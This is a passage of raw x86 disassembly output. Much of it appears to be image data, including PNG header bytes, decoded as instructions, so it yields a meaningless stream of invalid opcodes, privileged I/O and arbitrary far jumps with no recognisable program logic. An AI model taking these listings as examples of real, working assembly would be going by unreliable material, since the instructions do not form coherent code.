  406e8f:	ds inc eax
  406e91:	add    DWORD PTR [edx],eax
  406e93:	push   esp
  406e94:	ds sbb eax,0x34145221
  406e9a:	pop    ebx
  406e9b:	sub    al,0x2c
  406e9d:	sub    DWORD PTR [esi+0x40],ecx
  406ea0:	push   esi
  406ea1:	inc    esi
  406ea2:	push   esp
  406ea3:	push   esp
  406ea4:	or     dl,BYTE PTR ds:[eax]
  406ea7:	adc    al,0x16
  406ea9:	and    al,0x48
  406eab:	push   esi
  406eac:	es and eax,0x404e
  406eb2:	add    BYTE PTR [esi+edi*1+0x10],dl
  406eb6:	adc    bl,BYTE PTR [ebx]
  406eb8:	push   ss
  406eb9:	cs sub eax,0x4e264958
  406ebf:	inc    esp
  406ec0:	add    BYTE PTR [eax],al
  406ec2:	add    BYTE PTR [esi+edi*1+0xd],dl
  406ec6:	push   cs
  406ec7:	adc    eax,0x33332718
  406ecc:	xor    DWORD PTR [edx],ebp
  406ece:	dec    esi
  406ecf:	inc    esp
  406ed0:	add    BYTE PTR [eax],al
  406ed2:	add    BYTE PTR [esi+edi*1+0x3e],dl
  406ed6:	ds ds aas 
  406ed9:	inc    eax
  406eda:	inc    esp
  406edb:	inc    esp
  406edc:	inc    esp
  406edd:	inc    esi
  406ede:	dec    esi
  406edf:	inc    esp
  406ee0:	add    BYTE PTR [eax],al
  406ee2:	add    BYTE PTR [eax+0x54],bl
  406ee5:	push   esp
  406ee6:	push   esp
  406ee7:	push   esp
  406ee8:	push   esp
  406ee9:	push   esp
  406eea:	dec    esi
  406eeb:	dec    esi
  406eec:	push   ebx
  406eed:	dec    esi
  406eee:	dec    esi
  406eef:	push   esi
	...
  406f00:	(bad)  
  406f01:	inc    DWORD PTR [eax]
  406f03:	add    BYTE PTR [edi+eax*1],bl
  406f06:	add    BYTE PTR [eax],al
  406f08:	sbb    al,0xf
  406f0a:	add    BYTE PTR [eax],al
  406f0c:	pop    ds
  406f0d:	pop    ds
	...
  406f2a:	add    BYTE PTR [eax],al
  406f2c:	loopne 0x406f2e
  406f2e:	add    BYTE PTR [eax],al
  406f30:	loopne 0x406f32
  406f32:	add    BYTE PTR [eax],al
  406f34:	loopne 0x406f36
  406f36:	add    BYTE PTR [eax],al
  406f38:	loopne 0x406f3a
  406f3a:	add    BYTE PTR [eax],al
  406f3c:	(bad)  
  406f3d:	inc    DWORD PTR [eax]
  406f3f:	add    BYTE PTR [ecx+0xd474e50],cl
  406f45:	or     bl,BYTE PTR [edx]
  406f47:	or     al,BYTE PTR [eax]
  406f49:	add    BYTE PTR [eax],al
  406f4b:	or     eax,0x52444849
  406f50:	add    BYTE PTR [eax],al
  406f52:	add    DWORD PTR [eax],eax
  406f54:	add    BYTE PTR [eax],al
  406f56:	add    DWORD PTR [eax],eax
  406f58:	or     BYTE PTR [esi],al
  406f5a:	add    BYTE PTR [eax],al
  406f5c:	add    BYTE PTR [edx+esi*2-0x58],bl
  406f60:	data16 add BYTE PTR [eax],al
  406f63:	and    BYTE PTR [eax],al
  406f65:	dec    ecx
  406f66:	inc    esp
  406f67:	inc    ecx
  406f68:	push   esp
  406f69:	js     0x406f07
  406f6b:	in     al,dx
  406f6c:	mov    ebp,0xc92cb059
  406f71:	jns    0x406f52
  406f73:	test   ebx,0x4fdeaacc
  406f79:	neg    DWORD PTR [ecx-0x12]
  406f7c:	cmp    eax,DWORD PTR ds:[esi]
  406f7f:	sbb    DWORD PTR [ecx],0x0
  406f82:	add    al,0x41
  406f84:	pusha  
  406f85:	inc    eax
  406f86:	pop    eax
  406f87:	add    BYTE PTR [edi],dl
  406f89:	or     DWORD PTR [eax],edx
  406f8b:	add    DWORD PTR [ecx-0x29a4daec],ecx
  406f91:	sbb    dl,BYTE PTR [esi+0x3f2ae0ed]
  406f97:	(bad)  
  406f99:	mov    ebx,0x41ea37ad
  406f9e:	and    DWORD PTR ds:0xd17a1c38,edi
  406fa4:	add    esp,DWORD PTR ds:0x8a1c9f87
  406faa:	mov    al,0xb5
  406fac:	adc    dh,BYTE PTR [ecx+eax*1]
  406faf:	adc    ah,BYTE PTR [eax]
  406fb1:	or     BYTE PTR [edx+0x20067018],al
  406fb7:	data16 add BYTE PTR [ecx],0x6
  406fbb:	mov    bl,0xdf
  406fbd:	mov    ecx,0x3e967afb
  406fc2:	mov    ebp,0x7e9992d4
  406fc7:	enter  0xeacc,0xac
  406fcb:	jmp    0x773:0x33def73e
  406fd2:	or     edx,ebp
  406fd4:	pop    edi
  406fd5:	inc    esp
  406fd6:	lahf   
  406fd7:	rcr    DWORD PTR [ebp-0x6b],cl
  406fda:	mov    ch,0x65
  406fdc:	in     eax,0xf7
  406fde:	iret   
  406fdf:	push   DWORD PTR [edi+0x65ac2664]
  406fe5:	sub    eax,0x5acb596b
  406fea:	(bad)  
  406feb:	mov    dl,0x96
  406fed:	mov    ch,0xac
  406fef:	gs sub eax,0x5acb596b
  406ff5:	(bad)  
  406ff6:	mov    dl,0x96
  406ff8:	mov    ch,0xac
  406ffa:	gs sub eax,0x5acb596b
  407000:	(bad)  
  407001:	mov    dl,0x96
  407003:	mov    ch,0xac
  407005:	gs sub eax,0x5acb596b
  40700b:	(bad)  
  40700c:	mov    dl,0x96
  40700e:	mov    ch,0xac
  407010:	gs sub eax,0x5acb596b
  407016:	(bad)  
  407017:	mov    dl,0x96
  407019:	mov    ch,0xac
  40701b:	gs sub eax,0x5acb596b
  407021:	(bad)  
  407022:	mov    dl,0x96
  407024:	mov    ch,0xac
  407026:	gs sub eax,0x5acb596b
  40702c:	(bad)  
  40702d:	mov    dl,0x96
  40702f:	mov    ch,0xac
  407031:	gs sub eax,0x5acb596b
  407037:	(bad)  
  407038:	mov    dl,0x96
  40703a:	mov    ch,0xac
  40703c:	gs sub eax,0x5acb596b
  407042:	(bad)  
  407043:	mov    dl,0x96
  407045:	mov    ch,0xac
  407047:	gs sub eax,0x5acb596b
  40704d:	(bad)  
  40704e:	mov    dl,0x96
  407050:	mov    ch,0xac
  407052:	gs sub eax,0x5acb596b
  407058:	(bad)  
  407059:	mov    dl,0x96
  40705b:	mov    ch,0xac
  40705d:	gs sub eax,0x5acb596b
  407063:	(bad)  
  407064:	mov    dl,0x96
  407066:	mov    ch,0xac
  407068:	gs sub eax,0x5acb596b
  40706e:	(bad)  
  40706f:	mov    dl,0x96
  407071:	mov    ch,0xac
  407073:	gs sub eax,0x5acb596b
  407079:	(bad)  
  40707a:	mov    dl,0x96
  40707c:	mov    ch,0xac
  40707e:	gs sub eax,0x5acb596b
  407084:	(bad)  
  407085:	mov    dl,0x96
  407087:	mov    ch,0xac
  407089:	gs sub eax,0x5acb596b
  40708f:	(bad)  
  407090:	mov    dl,0x96
  407092:	mov    ch,0xac
  407094:	gs sub eax,0xc452396b
  40709a:	psubq  mm0,QWORD PTR [esi]
  40709d:	jle    0x4070bb
  40709f:	in     eax,0x7f
  4070a1:	jmp    DWORD PTR [edi-0x1]
  4070a4:	lods   al,BYTE PTR ds:[esi]
  4070a5:	mov    edi,0x3ea5b5b5
  4070aa:	cld    
  4070ab:	hlt    
  4070ac:	sar    DWORD PTR [esp+esi*8],cl
  4070af:	enter  0x7923,0xb7
  4070b3:	xlat   BYTE PTR ds:[ebx]
  4070b4:	xor    edi,DWORD PTR [ebp+0x61ff2f5e]
  4070ba:	(bad)  
  4070bc:	pop    edx
  4070bd:	(bad)  
  4070be:	jb     0x40711c
  4070c0:	pop    ecx
  4070c1:	add    eax,eax
  4070c3:	xor    ebp,esp
  4070c5:	repz mov edi,0xd5a27bf7
  4070cb:	push   0xfffffffd
  4070cd:	mov    ss,WORD PTR [eax]
  4070cf:	loop   0x407134
  4070d1:	(bad)  
  4070d2:	fimul  DWORD PTR [ebx+0x42]
  4070d5:	mov    bl,cl
  4070d7:	mov    bl,0xc9
  4070d9:	in     al,0x5a
  4070db:	pop    ecx
  4070dc:	adc    al,0x37
  4070de:	rcl    DWORD PTR [esi-0x15],cl
  4070e1:	bound  ebx,QWORD PTR [edx-0xc8420dc]
  4070e7:	cmc    
  4070e8:	xlat   BYTE PTR ds:[ebx]
  4070e9:	pop    edi
  4070ea:	mov    esi,0x18c2e17c
  4070ef:	cwde   
  4070f0:	std    
  4070f1:	outs   dx,DWORD PTR ds:[esi]
  4070f2:	push   esp
  4070f4:	lahf   
  4070f5:	into   
  4070f6:	jle    0x4070d0
  4070f8:	idiv   DWORD PTR [esi+edx*4+0x6b251cb5]
  4070ff:	add    BYTE PTR [eax],bh
  407101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407102:	cld    
  407103:	rcr    DWORD PTR [edi],0xfc
  407106:	inc    ecx
  407107:	push   edi
  407108:	dec    ecx
  407109:	stc    
  40710a:	jge    0x40712d
  40710c:	les    eax,FWORD PTR [ebx+0x2a]
  40710f:	dec    ebp
  407110:	push   ecx
  407111:	adc    BYTE PTR [eax+0xa],0x21
  407115:	add    al,0xd6
  407117:	pop    edx
  407118:	retf   0xc8a2
  40711b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40711c:	xchg   ebx,eax
  40711d:	dec    ecx
  40711e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40711f:	mov    ch,0xbe
  407121:	outs   dx,BYTE PTR ds:[esi]
  407122:	mov    WORD PTR [ecx+0x7d],?
  407125:	ss popf 
  407127:	mov    esi,0xbfdfde35
  40712c:	outs   dx,BYTE PTR ds:[esi]
  40712d:	lods   eax,DWORD PTR ds:[esi]
  40712e:	mov    ebp,0x79798c68
  407133:	mov    esp,0x70e17fbf
  407138:	cmp    al,0xbe
  40713a:	and    eax,0xafff1885
  40713f:	mov    edi,0xfd95bf5
  407144:	sti    
  407145:	jns    0x40711d
  407147:	repnz pop edi
  407149:	mov    dh,0xac
  40714b:	add    eax,esp
  40714d:	cwde   
  40714e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407150:	das    
  407151:	jge    0x40713c
  407153:	xor    al,0xf0
  407155:	sub    dh,BYTE PTR [eax]
  407157:	dec    eax
  407158:	xchg   ebx,eax
  407159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40715a:	mov    esi,0x594c0853
  40715f:	xchg   edx,eax
  407160:	out    0x39,eax
  407162:	push   ss
  407163:	adc    BYTE PTR [edx+0x20],al
  407166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407167:	inc    esp
  407168:	sub    ebp,esp
  40716a:	jbe    0x4070ef
  40716c:	sub    ebx,ecx
  40716e:	xor    dl,bl
  407170:	pop    edx
  407171:	out    dx,eax
  407172:	add    DWORD PTR [edi+0x77b8b80b],ebp
  407178:	sti    
  407179:	test   ch,0xc9
  40717c:	loope  0x40715f
  40717e:	sub    eax,0x70c6d6e0
  407183:	js     0x4071f5
  407185:	repz cli 
  407187:	cmc    
  407188:	sbb    ecx,0x74
  40718b:	mov    edx,0x8fa3e0fb
  407190:	out    dx,al
  407191:	in     eax,dx
  407192:	pushf  
  407193:	cmp    al,0x39
  407195:	(bad)  
  407196:	out    0xd7,al
  407198:	mov    esi,0x93fa7e36
  40719d:	lahf   
  40719e:	pushf  
  40719f:	cld    
  4071a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071a1:	dec    edi
  4071a2:	jge    0x40714e
  4071a4:	cld    
  4071a5:	sar    DWORD PTR [esi],0xe9
  4071a8:	pop    edx
  4071a9:	dec    BYTE PTR [ebx-0x70]
  4071ac:	xor    eax,0xfe531c00
  4071b1:	loopne 0x4071be
  4071b3:	pop    edi
  4071b4:	clc    
  4071b5:	dec    ecx
  4071b6:	test   eax,0x2b40b3d4
  4071bb:	dec    ebp
  4071bc:	push   ebx
  4071bd:	mov    bh,0xd1
  4071bf:	pop    edx
  4071c0:	lods   al,BYTE PTR ds:[esi]
  4071c1:	jo     0x407218
  4071c3:	test   eax,0xcb2c92cb
  4071c8:	mov    al,0xd6
  4071ca:	and    al,BYTE PTR [ebp+0x85dbf00]
  4071d0:	adc    DWORD PTR [edx+edx*1+0x28024084],0x25021485
  4071db:	and    eax,0x4210492a
  4071e0:	push   eax
  4071e1:	push   0xffffff8d
  4071e3:	aad    0x1a
  4071e5:	sub    DWORD PTR [ebp+0x5ac28846],esp
  4071eb:	pop    ebx
  4071ec:	push   0xffffffad
  4071ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071ef:	dec    ecx
  4071f0:	xchg   edx,eax
  4071f1:	mov    esp,0x34bca521
  4071f6:	lahf   
  4071f7:	dec    esi
  4071f8:	das    
  4071f9:	into   
  4071fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071fb:	rcl    edi,cl
  4071fd:	mov    bh,0x4f
  4071ff:	sahf   
  407200:	cmp    al,0xf
  407202:	pop    esp
  407203:	jge    0x4071f8
  407205:	aad    0x57
  407207:	fistp  QWORD PTR [edx]
  407209:	jno    0x407205
  40720b:	hlt    
  40720c:	in     eax,dx
  40720d:	pop    edi
  40720e:	clc    
  40720f:	int3   
  407210:	addr16 out 0x3f,al
  407213:	mov    WORD PTR [edx-0x407034a8],?
  407219:	lods   al,BYTE PTR ds:[esi]
  40721a:	add    eax,esp
  40721c:	cwde   
  40721d:	repnz stc 
  40721f:	das    
  407220:	jl     0x407203
  407222:	out    0x12,eax
  407224:	sub    edi,edi
  407226:	adc    BYTE PTR [ecx],ah
  407228:	fs retf 
  40722a:	add    eax,DWORD PTR [eax+0x7917f68d]
  407230:	dec    esi
  407231:	xchg   ecx,eax
  407232:	out    0x58,eax
  407234:	jmp    0x4071ec
  407236:	or     ch,BYTE PTR [ecx]
  407238:	adc    DWORD PTR [esi],ebx
  40723a:	add    al,0xa4
  40723c:	adc    BYTE PTR [eax],ah
  40723e:	and    eax,0x7ef15f02
  407243:	pop    edi
  407244:	add    BYTE PTR [edx],cl
  407246:	adc    esi,edi
  407248:	sti    
  407249:	std    
  40724a:	popa   
  40724b:	lahf   
  40724c:	add    DWORD PTR [edi+ebp*1-0x69acffd5],esp
  407253:	and    BYTE PTR [esi+ebp*1+0x2108998d],al
  40725a:	sub    DWORD PTR cs:[ecx],esp
  40725d:	scas   al,BYTE PTR es:[edi]
  40725e:	sbb    BYTE PTR [eax+0x1afb580],bh
  407264:	pop    ss
  407265:	xchg   ebp,eax
  407266:	adc    BYTE PTR [edi-0x7b],dl
  407269:	xchg   esp,eax
  40726a:	scas   eax,DWORD PTR es:[edi]
  40726b:	sbb    ah,BYTE PTR [ebx-0x52]
  40726e:	or     ch,BYTE PTR [ecx]
  407270:	addr16 jg 0x407254
  407273:	adc    ebx,DWORD PTR [edi-0x4a784ca8]
  407279:	lods   al,BYTE PTR ds:[esi]
  40727a:	xchg   esp,eax
  40727b:	in     al,0xee
  40727d:	inc    ebp
  40727e:	(bad)  
  40727f:	adc    cl,BYTE PTR [ebx-0x5e]
  407282:	aam    0xc8
  407284:	sbb    ah,BYTE PTR [ebx]
  407286:	in     eax,0x8a
  407288:	jge    0x40728c
  40728a:	xor    dh,al
  40728c:	pusha  
  40728d:	ins    BYTE PTR es:[edi],dx
  40728e:	add    al,0x9
  407290:	(bad)  
  407291:	cmp    BYTE PTR [esi],dl
  407293:	and    BYTE PTR ds:0x31a45ac6,ah
  407299:	pop    eax
  40729a:	jg     0x407250
  40729c:	lock int3 
  40729e:	rcr    DWORD PTR [edx-0x75],0xc0
  4072a2:	add    DWORD PTR [ecx-0x8],ecx
  4072a5:	outs   dx,DWORD PTR ds:[esi]
  4072a6:	mov    eax,ds:0xa98c2cce
  4072ab:	add    ah,0x9f
  4072ae:	pop    ebp
  4072af:	and    eax,0xc6343249
  4072b4:	or     al,0x8d
  4072b6:	mov    ch,0xef
  4072b8:	seta   BYTE PTR [ebx-0x3dd296c0]
  4072bf:	cwde   
  4072c0:	cdq    
  4072c1:	test   BYTE PTR [ebp+0x6b],bh
  4072c4:	int3   
  4072c5:	test   DWORD PTR [edi+0x15ccf33f],ebp
  4072cb:	and    ebp,esp
  4072cd:	test   DWORD PTR [ebp-0xd6fa84b],0x4dea52b2
  4072d7:	imul   ebp,ebp,0x2b
  4072da:	inc    eax
  4072db:	test   BYTE PTR cs:[eax],ch
  4072de:	test   DWORD PTR [eax],edx
  4072e0:	lds    eax,FWORD PTR [edi+0x3e]
  4072e3:	repnz adc DWORD PTR [ebp+0x5f],edi
  4072e7:	sub    ebp,DWORD PTR [edx+0x2d]
  4072ea:	aas    
  4072eb:	push   ss
  4072ec:	mov    dl,0x6
  4072ee:	and    BYTE PTR [ebx-0x76],0xd1
  4072f2:	cli    
  4072f3:	test   BYTE PTR [eax],cl
  4072f5:	mov    ebp,0xad695e35
  4072fa:	lods   eax,DWORD PTR ds:[esi]
  4072fb:	xchg   esp,eax
  4072fc:	push   esi
  4072fd:	or     BYTE PTR [ecx+0x2b],al
  407300:	dec    ebp
  407301:	adc    DWORD PTR [edx+0x60],eax
  407304:	lods   al,BYTE PTR ds:[esi]
  407305:	lds    ebx,FWORD PTR [edx]
  407307:	jecxz  0x4072e1
  407309:	xor    BYTE PTR [ebp-0x4d62d6f8],0x1b
  407310:	add    edx,DWORD PTR [edx-0x7e]
  407313:	mov    ch,0xa0
  407315:	xor    eax,0x16674a46
  40731a:	pop    eax
  40731b:	pop    ebx
  40731c:	arpl   WORD PTR [edx],ax
  40731e:	add    BYTE PTR [esi-0x294cb2fb],al
  407324:	push   esi
  407325:	xlat   BYTE PTR ds:[ebx]
  407326:	lds    ebx,FWORD PTR [eax]
  407328:	mov    ah,0x31
  40732a:	aad    0x3d
  40732c:	inc    eax
  40732d:	popf   
  40732e:	into   
  40732f:	pop    ecx
  407330:	imul   edi,DWORD PTR [ebx+0x7108ba06],0xffffffc6
  407337:	xchg   esp,eax
  407338:	lds    edi,FWORD PTR gs:[esi]
  40733b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40733c:	xor    DWORD PTR [eax+0x63],ebx
  40733f:	dec    edx
  407340:	and    ebp,esp
  407342:	inc    esp
  407343:	ret    0x95a1
  407346:	jb     0x407354
  407348:	in     al,dx
  407349:	jle    0x40733e
  40734b:	(bad)  
  40734e:	pop    es
  40734f:	mov    BYTE PTR [edx-0x78],0x3d
  407353:	and    esp,eax
  407355:	ins    DWORD PTR es:[edi],dx
  407356:	pusha  
  407357:	(bad)  
  407359:	or     bh,BYTE PTR [edx+eiz*1-0x27ec877c]
  407360:	pop    es
  407361:	popw   ds
  407363:	(bad)  
  407364:	lock xchg edi,edx
  407367:	inc    eax
  407368:	icebp  
  407369:	out    0x48,eax
  40736b:	(bad)  
  40736c:	add    BYTE PTR [eax+0x4c],dh
  40736f:	xor    esi,eax
  407371:	ins    BYTE PTR es:[edi],dx
  407372:	add    DWORD PTR [ebx+ecx*1],esp
  407375:	(bad)  
  407376:	push   ds
  407377:	or     BYTE PTR [ecx-0x59],al
  40737a:	fucom  st(6)
  40737c:	lea    esi,[edi]
  40737e:	(bad)  
  407380:	(bad)  
  407381:	mov    edi,0xddba45f2
  407386:	xchg   esp,eax
  407387:	loope  0x4073f9
  407389:	xchg   ebx,eax
  40738a:	lods   eax,DWORD PTR ds:[esi]
  40738b:	lods   eax,DWORD PTR ds:[esi]
  40738c:	sbb    eax,0xfa4dc346
  407391:	or     DWORD PTR ds:0x2d16ad5a,0xffffffd5
  407398:	es ins DWORD PTR es:[edi],dx
  40739a:	mov    ch,0x2b
  40739c:	pop    edx
  40739d:	(bad)  
  40739e:	mov    ch,0x60
  4073a0:	mov    WORD PTR [ebx+0x1],fs
  4073a3:	inc    edx
  4073a4:	mov    eax,0xa45adf1e
  4073a9:	pop    es
  4073aa:	or     eax,DWORD PTR [edx-0x67]
  4073ad:	add    BYTE PTR [eax],cl
  4073af:	jle    0x407430
  4073b1:	adc    bl,ch
  4073b3:	scas   eax,DWORD PTR es:[edi]
  4073b4:	sub    eax,0x20c0b97c
  4073b9:	loop   0x4073b8
  4073bb:	and    al,BYTE PTR [edx]
  4073bd:	adc    cl,BYTE PTR [ecx+ecx*1+0x66304de7]
  4073c4:	test   DWORD PTR fs:[eax],ebx
  4073c7:	(bad)
  4073ca:	sub    edi,DWORD PTR [ecx+0xd]
  4073cd:	sbb    bl,BYTE PTR [eax-0x31fff1f]
  4073d3:	repz iret 
  4073d5:	aas    
  4073d6:	call   FWORD PTR [edx+0xe22e210]
  4073dc:	sbb    al,0x5e
  4073de:	add    ebx,esi
  4073e0:	adc    al,0x42
  4073e2:	pop    esp
  4073e3:	push   es
  4073e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073e5:	pop    ds
  4073e6:	cli    
  4073e7:	rol    BYTE PTR [edi+0x1f8d51d6],1
  4073ed:	xor    ebx,DWORD PTR [ecx+0x3]
  4073f0:	shl    BYTE PTR [ecx],0x45
  4073f3:	sub    DWORD PTR [ebp-0x1abae9a3],esi
  4073f9:	rol    bl,1
  4073fb:	test   edx,0xc1ca56ad
  407401:	rcr    DWORD PTR [eax+0x5df9f4ff],0xa6
  407408:	xor    eax,DWORD PTR [ebp-0x51]
  40740b:	jae    0x407396
  40740d:	rol    DWORD PTR [esi+0x46],1
  407410:	mov    edi,0xb69d05b
  407415:	dec    esi
  407416:	in     al,dx
  407417:	or     al,0xd9
  407419:	(bad)  
  40741b:	pusha  
  40741c:	jae    0x4073f2
  40741e:	cmp    BYTE PTR [si],bl
  407421:	mov    dl,0xbd
  407423:	jge    0x4073a7
  407425:	shr    DWORD PTR [eax-0x6d],1
  407428:	lea    ecx,[ebp-0x68b162df]
  40742e:	and    al,0x6d
  407430:	xchg   ecx,eax
  407431:	mov    ah,0x5a
  407433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407434:	dec    ecx
  407435:	mov    dh,BYTE PTR [ecx+0x7057ac06]
  40743b:	add    ebx,DWORD PTR [eax-0x15]
  40743e:	(bad)  
  40743f:	loope  0x407499
  407441:	inc    eax
  407442:	in     al,dx
  407443:	jae    0x40744d
  407445:	xlat   BYTE PTR ds:[ebx]
  407446:	scas   eax,DWORD PTR es:[edi]
  407447:	jle    0x40740b
  407449:	add    dl,BYTE PTR [esp+edi*8]
  40744c:	jle    0x4073ff
  40744e:	inc    edx
  40744f:	mov    cl,0x2b
  407451:	(bad)  
  407452:	mov    dl,0xe2
  407454:	sbb    DWORD PTR [ebx+0x4c],ebp
  407457:	add    edx,DWORD PTR [ebp+esi*4+0x18842076]
  40745e:	add    BYTE PTR [edi],cl
  407460:	add    BYTE PTR [edi-0x7f30eb94],bl
  407466:	cmp    DWORD PTR [eax-0x17],esi
  407469:	fcmovnu st,st(7)
  40746b:	(bad)  
  40746c:	imul   BYTE PTR [ebx-0x3bdeda40]
  407472:	adc    eax,0x22e015e0
  407477:	jo     0x4074ca
  407479:	or     BYTE PTR [ecx+0x13],dh
  40747c:	cwde   
  40747d:	jl     0x40746f
  40747f:	sbb    DWORD PTR [edi],0xffffffb4
  407482:	lods   al,BYTE PTR ds:[esi]
  407483:	in     eax,0x47
  407485:	dec    edx
  407486:	(bad)  
  407487:	add    BYTE PTR [eax+0x4c],dh
  40748a:	mov    cl,0xc6
  40748c:	mov    esp,0x1acf7c07
  407491:	jp     0x4074fa
  407493:	inc    eax
  407494:	and    bl,BYTE PTR [eax-0x10518d33]
  40749a:	(bad)  
  40749b:	adc    al,0xd3
  40749d:	fnstcw WORD PTR [ecx]
  40749f:	lods   al,BYTE PTR ds:[esi]
  4074a0:	sub    al,0xe0
  4074a2:	jp     0x40742d
  4074a4:	adc    al,0x86
  4074a6:	inc    esp
  4074a7:	int    0x69
  4074a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074aa:	arpl   WORD PTR [edx-0x37],bx
  4074ad:	sbb    BYTE PTR [ebp+0x75c9a4a6],ah
  4074b3:	cli    
  4074b4:	mov    ebp,0x86da74eb
  4074b9:	jbe    0x4074c6
  4074bb:	mov    dh,0xb7
  4074bd:	ficomp DWORD PTR [ecx+edi*1-0x548c982f]
  4074c4:	ret    
  4074c5:	jo     0x40749f
  4074c7:	cmp    BYTE PTR gs:[eax-0x2f],ch
  4074cb:	jmp    0x4074f3
  4074cd:	je     0x407509
  4074cf:	or     ebp,ebx
  4074d1:	outs   dx,BYTE PTR ds:[esi]
  4074d2:	fwait
  4074d3:	outs   dx,BYTE PTR ds:[esi]
  4074d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074d5:	dec    edi
  4074d6:	fisubr DWORD PTR [edx-0x2d]
  4074d9:	push   0x75
  4074db:	push   0x49243ab5
  4074e0:	dec    edx
  4074e1:	xchg   edx,eax
  4074e2:	sub    BYTE PTR [esp+ecx*2+0x6b41cf9c],dl
  4074e9:	je     0x4074eb
  4074eb:	push   es
  4074ec:	fistp  WORD PTR [ebx+0x358166c7]
  4074f2:	push   es
  4074f3:	loope  0x40750e
  4074f5:	mov    ecx,DWORD PTR ds:0xe0a084be
  4074fb:	shl    DWORD PTR [ebx],1
  4074fd:	les    ecx,FWORD PTR [edx+0x3b8100df]
  407503:	in     eax,dx
  407504:	imul   ebx,DWORD PTR [ebx+0x6b],0xffffffdb
  407508:	inc    edx
  407509:	mov    BYTE PTR [ecx],dl
  40750b:	lock add esi,0x3d82c37e
  407512:	mov    esp,0x2f8be2f2
  407517:	pop    esi
  407518:	push   es
  407519:	cs js  0x40755c
  40751c:	fadd   DWORD PTR [ebx]
  40751e:	mov    al,0xbe
  407521:	adc    BYTE PTR [edx-0x29],ah
  407524:	jg     0x407545
  407526:	add    edi,DWORD PTR [ebx+0x42]
  407529:	mov    cl,ch
  40752b:	push   ebx
  40752c:	dec    edi
  40752d:	cmp    eax,0xfe5c76b5
  407532:	add    BYTE PTR [ebp+ecx*1+0x0],ah
  407536:	(bad)  
  407537:	nop
  407538:	(bad)  
  40753a:	popf   
  40753b:	fild   QWORD PTR [ecx-0x6b]
  40753e:	pop    edx
  40753f:	jg     0x4074f1
  407541:	jmp    0xa14a:0x25b2bdfd
  407548:	lods   eax,DWORD PTR ds:[esi]
  407549:	out    0xd6,al
  40754b:	lods   eax,DWORD PTR ds:[esi]
  40754c:	sub    DWORD PTR [ebp-0x67],esp
  40754f:	pusha  
  407550:	inc    ebp
  407551:	loope  0x4075bf
  407553:	jl     0x40758f
  407555:	sbb    BYTE PTR [ebx+0x5c88f5c8],ch
  40755b:	aas    
  40755c:	sub    BYTE PTR [ebx-0x27e7fe92],0xc5
  407563:	pop    ds
  407564:	outs   dx,DWORD PTR ds:[esi]
  407565:	inc    eax
  407566:	sbb    BYTE PTR [eax],dh
  407568:	and    eax,0xf4d08050
  40756d:	cmp    eax,DWORD PTR [edi+0x7487db74]
  407573:	cmp    esi,DWORD PTR [ebx+0x7a]
  407576:	popf   
  407577:	cmp    ebx,eax
  407579:	fisub  WORD PTR [ecx]
  40757b:	mov    ebp,0x276e8cf6
  407580:	jecxz  0x407566
  407582:	dec    esi
  407583:	(bad)  
  407584:	popf   
  407585:	in     eax,dx
  407586:	add    DWORD PTR [ebx],ebx
  407588:	sbb    ebx,DWORD PTR ds:0xd83736b6
  40758e:	(bad)  
  407590:	mov    ds:0xd8321fd7,al
  407595:	sbb    dl,dl
  407597:	in     eax,dx
  407598:	or     eax,0x548a5448
  40759d:	mov    ah,BYTE PTR [ecx+esi*8]
  4075a0:	adc    DWORD PTR [edx],ecx
  4075a2:	arpl   WORD PTR [ecx+ebx*4+0x1a9efe01],bx
  4075a9:	retf   0x92cc
  4075ac:	out    dx,eax
  4075ad:	loopne 0x40759c
  4075af:	add    al,0x51
  4075b2:	mov    edi,0xd6b7d025
  4075b7:	test   BYTE PTR [ebp+0x2a8ee710],0x8b
  4075be:	xor    esi,DWORD PTR [ebx]
  4075c0:	dec    edx
  4075c1:	call   FWORD PTR [ecx]
  4075c3:	add    esp,edi
  4075c5:	pop    edi
  4075c6:	jp     0x4075b1
  4075c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075c9:	stos   DWORD PTR es:[edi],eax
  4075ca:	rcr    BYTE PTR [ebx-0x4873b3d4],0x80
  4075d1:	aaa    
  4075d2:	add    BYTE PTR [ebx],0x21
  4075d5:	(bad)  
  4075d6:	cld    
  4075d7:	jge    0x4075c8
  4075d9:	jnp    0x4075ba
  4075db:	call   0xc003:0x5907dc4d
  4075e2:	xor    DWORD PTR [ebp+eiz*1+0x49],eax
  4075e6:	xlat   BYTE PTR ds:[ebx]
  4075e7:	push   0xfffffffd
  4075e9:	push   eax
  4075ea:	aad    0x78
  4075ec:	inc    ebx
  4075ed:	mov    WORD PTR [edi+0x29],ds
  4075f0:	mov    WORD PTR [esi],gs
  4075f2:	mov    ecx,0x368c737e
  4075f7:	fwait
  4075f8:	mov    esi,0x16e5074
  4075fd:	ret    0x2d7a
  407600:	mov    ebp,eax
  407602:	mov    edx,0x122060f0
  407607:	call   DWORD PTR [ecx-0x67dfebe0]
  40760d:	xchg   esp,eax
  40760e:	or     DWORD PTR [ebx-0x38273dbe],edx
  407614:	add    al,0x64
  407616:	xchg   BYTE PTR [eax+0x5272251a],dl
  40761c:	xor    eax,0xd2ee9da1
  407621:	dec    esi
  407622:	(bad)  
  407623:	je     0x40767f
  407625:	xchg   DWORD PTR [ebx+edi*2],ecx
  407628:	mov    bh,0x18
  40762a:	or     eax,0x737a0ce6
  40762f:	jbe    0x4075e7
  407631:	pop    edx
  407632:	in     al,dx
  407633:	ins    BYTE PTR es:[edi],dx
  407634:	neg    DWORD PTR [eax]
  407636:	neg    bl
  407638:	ins    BYTE PTR es:[edi],dx
  407639:	ins    DWORD PTR es:[edi],dx
  40763a:	outs   dx,DWORD PTR ds:[esi]
  40763b:	mov    al,0xb5
